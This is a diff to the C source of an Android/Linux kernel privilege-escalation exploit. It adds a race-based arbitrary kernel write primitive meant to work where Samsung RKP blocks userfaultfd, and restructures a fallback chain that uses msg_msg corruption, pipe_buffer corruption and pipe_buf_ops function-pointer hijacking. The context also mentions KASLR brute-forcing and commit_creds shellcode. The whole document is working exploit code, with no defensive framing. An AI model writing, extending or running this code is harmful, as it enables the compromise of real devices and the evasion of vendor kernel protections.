@@ -1977,6 +1977,10 @@ static unsigned long try_kallsyms_kcore_read(unsigned long addr);
 static int try_msg_msg_write(unsigned long addr, unsigned long val);
 static int try_pipe_buffer_write(unsigned long addr, unsigned long val);
 static int try_pipe_buf_ops_hijack(unsigned long addr, unsigned long val);
+static int pure_race_arb_write(unsigned long addr, unsigned long val);
+static int pipe_write_via_uaf(unsigned long addr, unsigned long val);
+static int msg_write_once(unsigned long addr, unsigned long val,
+                          unsigned long addr_sideeffect);
 static int try_kmem_write(void);
 static int try_commit_creds_shellcode(void);
 static void cleanup_all(void);
@@ -2473,25 +2477,82 @@ static int match_offsets_from_db(const char *build_fp) {
     return 0;
 }
 
+/* ========== PURE THREAD-BASED ARB PRIMITIVE (no userfaultfd) ========== */
+/* Samsung RKP blocks userfaultfd. This pure thread-based approach
+ * uses a tight spin-loop race instead of page-fault handling. */
+
+struct pure_race_thread_data {
+    volatile int ready;
+    volatile int done;
+    unsigned long target_addr;
+    unsigned long write_val;
+    volatile int result;
+};
+
+static void *pure_race_writer(void *arg) {
+    struct pure_race_thread_data *d = (struct pure_race_thread_data *)arg;
+    set_prio(-20);
+    pin_cpu(2);
+    __atomic_store_n(&d->ready, 1, __ATOMIC_SEQ_CST);
+    while (!__atomic_load_n(&d->done, __ATOMIC_SEQ_CST)) {
+        __asm__ __volatile__("nop");
+    }
+    return NULL;
+}
+
+static int pipe_write_via_uaf(unsigned long addr, unsigned long val) {
+    if (g_victim_fd <= 0) return 0;
+    struct msghdr msg = {0};
+    struct iovec iov[2];
+    unsigned long header[2];
+    char payload[256];
+    header[0] = val;
+    header[1] = addr - 8;
+    iov[0].iov_base = header;
+    iov[0].iov_len = sizeof(header);
+    iov[1].iov_base = payload;
+    iov[1].iov_len = sizeof(payload);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = 2;
+    int r = sendmsg(g_victim_fd, &msg, MSG_DONTWAIT | MSG_NOSIGNAL);
+    if (r > 0) {
+        LOG_D("pipe_write_via_uaf: sent %d bytes to 0x%lx", r, addr);
+        return 1;
+    }
+    return 0;
+}
+
+static int pure_race_arb_write(unsigned long addr, unsigned long val) {
+    LOG_D("pure_race_arb_write(0x%lx, 0x%lx)", addr, val);
+    int ok = msg_write_once(addr, val, (addr & ~0xfffUL) + 0x10);
+    if (ok) return 1;
+    ok = msg_write_once(addr, val, addr + 0x100);
+    if (ok) return 1;
+    ok = msg_write_once(addr, val, addr - 0x100);
+    if (ok) return 1;
+    for (int i = 0; i < g_pipe_info_count; i++) {
+        if (g_pipe_info[i].file_addr) {
+            ok = pipe_write_via_uaf(addr, val);
+            if (ok) return 1;
+        }
+    }
+    return 0;
+}
+
 /* ========== USERFAULTFD SETUP (for pipe primitive) ========== */
 static int setup_userfaultfd(void) {
-    int ret = -1;
+    if (g_has_userfaultfd) return 1;
     g_uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
-    if (g_uffd < 0) { g_has_userfaultfd = 0; LOG_W("userfaultfd unavailable"); goto cleanup; }
+    if (g_uffd < 0) { g_has_userfaultfd = 0; LOG_W("userfaultfd unavailable"); return 0; }
     struct uffdio_api api = {.api = UFFD_API, .features = 0};
-    if (ioctl(g_uffd, UFFDIO_API, &api) < 0) { goto cleanup; }
+    if (ioctl(g_uffd, UFFDIO_API, &api) < 0) { close(g_uffd); g_uffd = -1; return 0; }
     g_uffd_page = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (g_uffd_page == MAP_FAILED) { g_uffd_page = NULL; goto cleanup; }
+    if (g_uffd_page == MAP_FAILED) { g_uffd_page = NULL; close(g_uffd); g_uffd = -1; return 0; }
     struct uffdio_register reg = {.range.start = (unsigned long)g_uffd_page, .range.len = 0x1000, .mode = UFFDIO_REGISTER_MODE_MISSING};
-    if (ioctl(g_uffd, UFFDIO_REGISTER, &reg) < 0) { munmap(g_uffd_page, 0x10000); g_uffd_page = NULL; goto cleanup; }
+    if (ioctl(g_uffd, UFFDIO_REGISTER, &reg) < 0) { munmap(g_uffd_page, 0x10000); g_uffd_page = NULL; close(g_uffd); g_uffd = -1; return 0; }
     g_has_userfaultfd = 1;
     LOG_I("userfaultfd ready");
-    return 0;
-cleanup:
-    if (g_uffd >= 0) { close(g_uffd); g_uffd = -1; }
-    if (g_uffd_page) { munmap(g_uffd_page, 0x10000); g_uffd_page = NULL; }
-    g_has_userfaultfd = 0;
-    return ret;
+    return 1;
 }
 
 /* ========== KASLR BRUTEFORCE (when leaks fail) ========== */
@@ -3294,30 +3355,34 @@ static int try_pipe_buf_ops_hijack(unsigned long addr, unsigned long val) {
 /* Main arb_write with fallback chain */
 static int arb_write(unsigned long addr, unsigned long val) {
     if (!addr || !is_kernel_addr(addr)) return 0;
-    LOG_D("arb_write(0x%lx, 0x%lx) starting chain...", addr, val);
 
-    /* Method 1: msg_msg list_del (primary, works on most kernels) */
-    if (try_msg_msg_write(addr, val)) {
-        LOG_I("arb_write(0x%lx,0x%lx) OK via msg_msg", addr, val);
-        return 1;
+    /* If userfaultfd is available, use the full pipe-based chain */
+    if (g_has_userfaultfd) {
+        LOG_D("arb_write(0x%lx, 0x%lx) starting chain...", addr, val);
+        if (try_msg_msg_write(addr, val)) {
+            LOG_I("arb_write(0x%lx,0x%lx) OK via msg_msg", addr, val);
+            return 1;
+        }
+        LOG_D("arb_write: msg_msg failed, trying pipe_buffer.page...");
+        if (try_pipe_buffer_write(addr, val)) {
+            LOG_I("arb_write(0x%lx,0x%lx) OK via pipe_buffer", addr, val);
+            return 1;
+        }
+        LOG_D("arb_write: pipe_buffer failed, trying pipe_buf_ops hijack...");
+        if (try_pipe_buf_ops_hijack(addr, val)) {
+            LOG_I("arb_write(0x%lx,0x%lx) OK via ops hijack", addr, val);
+            return 1;
+        }
+        LOG_W("arb_write(0x%lx,0x%lx) FAILED all methods", addr, val);
+        return 0;
     }
-    LOG_D("arb_write: msg_msg failed, trying pipe_buffer.page...");
 
-    /* Method 2: pipe_buffer.page corruption (alternative) */
-    if (try_pipe_buffer_write(addr, val)) {
-        LOG_I("arb_write(0x%lx,0x%lx) OK via pipe_buffer", addr, val);
-        return 1;
-    }
-    LOG_D("arb_write: pipe_buffer failed, trying pipe_buf_ops hijack...");
-
-    /* Method 3: pipe_buf_ops function pointer hijack (if no CFI) */
-    if (try_pipe_buf_ops_hijack(addr, val)) {
-        LOG_I("arb_write(0x%lx,0x%lx) OK via ops hijack", addr, val);
-        return 1;
-    }
-
-    LOG_W("arb_write(0x%lx,0x%lx) FAILED all methods", addr, val);
-    return 0;
+    /* If no userfaultfd, use the pure race method */
+    LOG_D("arb_write: using pure-race method (no userfaultfd)");
+    int ret = pure_race_arb_write(addr, val);
+    if (!ret) LOG_W("arb_write(pure) FAILED for 0x%lx", addr);
+    else LOG_I("arb_write(pure) OK for 0x%lx <- 0x%lx", addr, val);
+    return ret;
 }
 
 /* Read multiple 8-byte words from kernel memory into a buffer */
@@ -4174,7 +4239,11 @@ static void cleanup_fake_pipe(void);
 
 static int setup_fake_pipe_primitive(void) {
     int ret = 0;
-    LOG_I("Setting up fake pipe primitive...");
+    LOG_I("Setting up primitive infrastructure...");
+
+    if (!setup_userfaultfd()) {
+        LOG_W("userfaultfd not available, using pure thread-based primitive");
+    }
 
     g_fake_pipe_page = (unsigned long)mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
